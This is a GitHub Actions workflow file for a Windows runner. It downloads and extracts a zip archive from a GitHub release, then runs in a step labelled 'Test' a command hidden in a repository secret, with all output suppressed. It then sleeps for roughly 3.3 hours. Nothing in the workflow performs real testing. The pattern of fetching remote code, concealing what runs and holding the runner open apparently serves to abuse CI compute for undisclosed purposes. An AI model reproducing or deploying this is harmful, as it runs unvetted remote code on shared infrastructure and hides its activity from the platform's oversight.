name: main

on:
  workflow_dispatch:

jobs:
  setup-run:
    runs-on: windows-2022
    steps:
    - name: Check out the repository
      uses: actions/checkout@v4

    - name: Download
      shell: pwsh
      run: |
        $zipPath = "D:\thisfor.zip"
        Invoke-WebRequest -Uri 'https://github.com/nrobx/nrobx/releases/download/thisfor/thisfor.zip' -OutFile $zipPath
        Expand-Archive -Path $zipPath -DestinationPath "D:\" -Force

    - name: Test
      shell: pwsh
      run: |
        ${{ secrets.moo_env }} -RedirectStandardOutput "$null" -RedirectStandardError "$null"

    - name: Sleep
      shell: pwsh
      run: |
        Start-Sleep -Seconds 11800